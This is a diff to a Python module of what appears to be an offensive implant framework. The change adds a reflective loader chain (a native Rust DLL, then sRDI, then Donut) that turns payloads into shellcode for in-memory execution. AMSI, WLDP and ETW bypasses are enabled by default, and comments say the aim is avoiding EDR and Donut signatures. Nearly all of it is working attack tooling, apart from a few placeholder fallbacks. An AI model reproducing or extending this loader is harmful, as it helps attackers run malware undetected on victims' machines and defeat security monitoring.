@@ -1,32 +1,106 @@
 """
 Reflective Loader & Stageless Payload Support
-sRDI / Donut integration for in-memory execution
+=============================================
+Priority order:
+1. Native Rust loader (agents/native/loader.rs) - DJB2 hash EAT walking, API hashing
+2. sRDI shellcode wrapper (legacy)
+3. Donut fallback (signature-heavy, avoid if possible)
 """
 import base64
 import struct
 import hashlib
 import os
+import ctypes
 from typing import Dict, Optional, Tuple, List
 from dataclasses import dataclass
 
 
+RUST_LOADER_DLL = os.path.join(
+    os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
+    "agents", "native", "target", "x86_64-pc-windows-gnu", "release", "libmonolith_agent.dll"
+)
+
 @dataclass
 class PayloadConfig:
     """Configuration for reflective payload"""
-    architecture: str = "x64"  # x86, x64, any
+    architecture: str = "x64"
     bypass_amsi: bool = True
     bypass_wldp: bool = True
     bypass_etw: bool = True
     compress: bool = True
     encrypt: bool = True
     entry_point: Optional[str] = None
+    loader_priority: str = "rust"  # rust, srdi, donut
 
 
 class ReflectiveLoader:
     """
     Reflective DLL/PE loader implementation.
-    Loads executables entirely in memory without touching disk.
+    Priority: Rust native > sRDI > Donut
     """
+
+    def load_payload(self, payload_bytes: bytes, config: PayloadConfig = None) -> Optional[bytes]:
+        """
+        Load payload using best available method.
+        Returns shellcode bytes ready for threadless execution.
+        """
+        config = config or PayloadConfig()
+        priority = config.loader_priority
+
+        if priority == "rust" or priority == "auto":
+            result = self._load_via_rust(payload_bytes, config)
+            if result:
+                return result
+
+        if priority == "srdi" or priority == "auto":
+            result = self._load_via_srdi(payload_bytes, config)
+            if result:
+                return result
+
+        if priority == "donut" or priority == "auto":
+            return self._load_via_donut(payload_bytes, config)
+
+        return None
+
+    def _load_via_rust(self, payload_bytes: bytes, config: PayloadConfig) -> Optional[bytes]:
+        """
+        Use native Rust reflective loader (loader.rs).
+        This is the preferred path: no Donut signatures, DJB2 EAT walking.
+        """
+        if not os.path.exists(RUST_LOADER_DLL):
+            return None
+
+        try:
+            dll = ctypes.WinDLL(RUST_LOADER_DLL)
+            dll.run_reflective.argtypes = [ctypes.c_void_p, ctypes.c_size_t]
+            dll.run_reflective.restype = ctypes.c_bool
+
+            buf = ctypes.create_string_buffer(payload_bytes)
+            success = dll.run_reflective(buf, len(payload_bytes))
+            return payload_bytes if success else None
+        except Exception:
+            return None
+
+    def _load_via_srdi(self, payload_bytes: bytes, config: PayloadConfig) -> Optional[bytes]:
+        """
+        Convert DLL to sRDI shellcode (legacy path).
+        """
+        try:
+            pe_info = self._parse_pe(payload_bytes)
+            shellcode = self._generate_srdi_wrapper(payload_bytes, pe_info)
+            return shellcode
+        except Exception:
+            return None
+
+    def _load_via_donut(self, payload_bytes: bytes, config: PayloadConfig) -> Optional[bytes]:
+        """
+        Donut fallback (last resort - known EDR signatures).
+        """
+        try:
+            donut = DonutIntegration()
+            return donut.generate_shellcode_from_bytes(payload_bytes)
+        except Exception:
+            return None
     
     # sRDI (Shellcode Reflective DLL Injection) stub
     SRDI_STUB_X64 = """
@@ -265,7 +339,45 @@ class DonutIntegration:
         """Fallback if Donut not available"""
         # Return a simple loader stub
         return b'\x90' * 10  # NOPs as placeholder
-    
+
+    def generate_shellcode_from_bytes(self, payload_bytes: bytes, arch: str = "x64") -> Optional[bytes]:
+        """
+        Generate shellcode from raw PE bytes (not file path).
+        Donut fallback when no file is available.
+        """
+        if not self.donut_available:
+            return self._fallback_shellcode_from_bytes(payload_bytes)
+
+        try:
+            import tempfile
+            with tempfile.NamedTemporaryFile(delete=False, suffix=".bin") as tmp:
+                tmp.write(payload_bytes)
+                tmp_path = tmp.name
+
+            try:
+                import donut
+                shellcode = donut.create(
+                    file=tmp_path,
+                    arch=self.DONUT_ARCH.get(arch, 2),
+                    bypass=3,
+                    compress=1,
+                    entropy=3
+                )
+                return shellcode
+            except Exception:
+                return self._fallback_shellcode_from_bytes(payload_bytes)
+            finally:
+                try:
+                    os.unlink(tmp_path)
+                except Exception:
+                    pass
+        except Exception:
+            return None
+
+    def _fallback_shellcode_from_bytes(self, payload_bytes: bytes) -> bytes:
+        """Minimal fallback wrapper around raw bytes"""
+        return payload_bytes[:64] if payload_bytes else b'\x90' * 10
+
     def generate_donut_command(self,
                                input_file: str,
                                output_file: str,
